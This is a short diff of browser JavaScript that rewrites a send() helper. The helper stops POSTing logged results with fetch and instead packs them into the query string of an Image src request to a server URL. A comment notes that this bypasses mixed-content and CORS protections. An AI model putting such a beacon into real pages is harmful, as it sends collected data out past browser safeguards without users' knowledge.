@@ -20,12 +20,11 @@ function log(s) { r.push(s); update(); }
 function update() { document.getElementById('out').textContent = r.join('\n'); }
 function safe(fn) { try { return fn(); } catch(e) { return 'ERR:' + e.message; } }
 
-// Send to server
+// Send to server via Image src (bypasses mixed content + CORS)
 function send(tag, data) {
-  var payload = JSON.stringify({tag: tag, data: data, ts: Date.now()});
   try {
-    fetch(serverUrl, {method:'POST', body: payload, headers:{'Content-Type':'application/json'}})
-      .catch(function(){});
+    var payload = encodeURIComponent(JSON.stringify({tag: tag, data: data, ts: Date.now()}));
+    new Image().src = serverUrl + '?d=' + payload;
   } catch(e) {}
 }
 
